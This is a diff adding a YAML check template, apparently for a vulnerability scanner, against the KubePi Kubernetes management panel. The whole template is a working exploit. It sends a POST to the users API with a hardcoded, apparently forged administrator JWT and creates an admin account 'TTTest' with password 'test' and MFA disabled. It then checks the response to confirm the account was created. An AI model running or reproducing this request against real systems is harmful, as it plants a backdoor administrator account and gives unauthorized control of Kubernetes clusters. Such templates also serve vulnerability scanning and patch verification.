@@ -1,0 +1,30 @@
+name: K8S管理面板-KubePi-createuser
+description: >-
+  任意用户创建,登录方式:TTTest/test
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /kubepi/api/v1/users
+    headers:
+      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8"
+      Content-Type: "application/json"
+    body: >
+      {
+        "authenticate": {
+             "password": "test"
+        },
+        "email": "testtest@TTTest.com",
+        "isAdmin": true,
+        "mfa": {
+                "enable": false
+         },
+        "name": "TTTest",
+        "nickName": "test",
+        "roles": [
+             "Supper User"
+        ]
+      }
+    expression:
+      status: 200
+      body_all: ["testtest@TTTest.com"]
